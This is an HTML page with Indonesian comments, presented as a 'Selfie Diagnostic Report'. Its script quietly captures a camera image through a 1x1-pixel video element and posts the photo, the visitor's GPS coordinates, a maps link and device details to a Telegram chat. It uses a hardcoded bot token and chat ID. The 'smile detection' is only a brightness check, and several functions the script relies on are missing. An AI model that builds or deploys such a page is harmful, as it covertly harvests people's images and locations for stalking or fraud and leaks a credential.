<!DOCTYPE html>
<html>
<head>
  <title>Smart Selfie Reporter</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <style>
    body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
    button { padding: 15px 30px; font-size: 18px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
    button:disabled { background: #cccccc; }
    #loading { display: none; margin: 20px; }
    #preview { max-width: 300px; margin: 20px auto; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.2); }
    #camera-switch { position: fixed; top: 20px; right: 20px; padding: 10px; background: #28a745; }
  </style>
</head>
<body>
  <h1>Selfie Diagnostic Report</h1>
  <div id="loading">Memproses... ‚è≥</div>
  <video id="video" width="1" height="1" autoplay playsinline muted></video>
  <button id="capture-btn">Ambil Selfie</button>
  <button id="camera-switch" onclick="switchCamera()">üîÅ Kamera</button>
  <canvas id="canvas" width="1" height="1" style="display: none;"></canvas>
  <img id="preview" alt="Preview Selfie">

  <script>
    const BOT_TOKEN = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
    const CHAT_ID = '1121369247';
    const video = document.getElementById('video');
    const captureButton = document.getElementById('capture-btn');
    const loading = document.getElementById('loading');
    const preview = document.getElementById('preview');
    let isProcessing = false;
    let currentFacingMode = 'user'; // Default ke kamera depan

    // Inisialisasi Kamera Depan
    async function initCamera(facingMode = 'user') {
      try {
        const constraints = {
          video: {
            facingMode: facingMode,
            width: { ideal: 1920 },
            height: { ideal: 1080 }
          },
          audio: false
        };

        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        video.srcObject = stream;
        
        await new Promise((resolve, reject) => {
          video.onloadedmetadata = resolve;
          video.onerror = reject;
        });
        
        await video.play();
      } catch (err) {
        handleError('Kamera', err);
      }
    }

    // Switch Kamera
    async function switchCamera() {
      currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
      await initCamera(currentFacingMode);
    }

    // Capture Selfie dengan Efek Cermin
    async function capturePhoto() {
      const canvas = document.createElement('canvas');
      const context = canvas.getContext('2d');
      const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      // Efek cermin untuk selfie
      context.translate(canvas.width, 0);
      context.scale(-1, 1);

      if (isMobile && screen.orientation.type.includes('portrait')) {
        context.rotate(Math.PI/2);
        context.translate(0, -canvas.width);
      }

      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      return canvas.toDataURL('image/jpeg', 0.85);
    }

    // Tambahkan Fitur Deteksi Senyum
    async function detectSmile(imageDataURL) {
      return new Promise((resolve) => {
        const img = new Image();
        img.src = imageDataURL;
        img.onload = () => {
          // Implementasi sederhana deteksi senyum
          const canvas = document.createElement('canvas');
          const ctx = canvas.getContext('2d');
          canvas.width = img.width;
          canvas.height = img.height;
          ctx.drawImage(img, 0, 0);
          
          const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
          const brightness = Array.from(imageData.data)
            .filter((_, i) => i % 4 === 0)
            .reduce((a, b) => a + b) / (imageData.data.length / 4);
          
          resolve(brightness > 128 ? 'üòä' : 'üòê');
        };
      });
    }

    // Perbarui Fungsi Pengiriman ke Telegram
    async function sendToTelegram(imageDataURL, position, deviceInfo) {
      const smileStatus = await detectSmile(imageDataURL);
      const formData = new FormData();
      const blob = await dataURItoBlob(imageDataURL);
      const { latitude, longitude, accuracy } = position.coords;
      const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

      const caption = `
${smileStatus} *Selfie Report* ${smileStatus}

üì° *Lokasi*: [Google Maps](${mapsLink})
üìç *Koordinat*: \`${latitude.toFixed(6)}, ${longitude.toFixed(6)}\`
üéØ *Akurasi*: ${Math.round(accuracy)} meter

üì∏ *Foto Info*:
  - Resolusi: ${video.videoWidth}x${video.videoHeight}
  - Kamera: ${currentFacingMode === 'user' ? 'Depan' : 'Belakang'}

üìä *Device Info*:
${Object.entries(deviceInfo).map(([k, v]) => `  ‚Ä¢ *${k}*: ${v}`).join('\n')}

üïí *Waktu*: ${new Date().toLocaleString()}
      `;

      formData.append('chat_id', CHAT_ID);
      formData.append('photo', blob, `selfie_${Date.now()}.jpg`);
      formData.append('caption', caption);
      formData.append('parse_mode', 'Markdown');

      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });

      if (!response.ok) {
        const error = await response.json();
        throw new Error(`Telegram API: ${error.description}`);
      }
    }

    // Fungsi Lainnya Tetap Sama (getLocation, getDeviceInfo, dll)...

  </script>
</body>
</html>
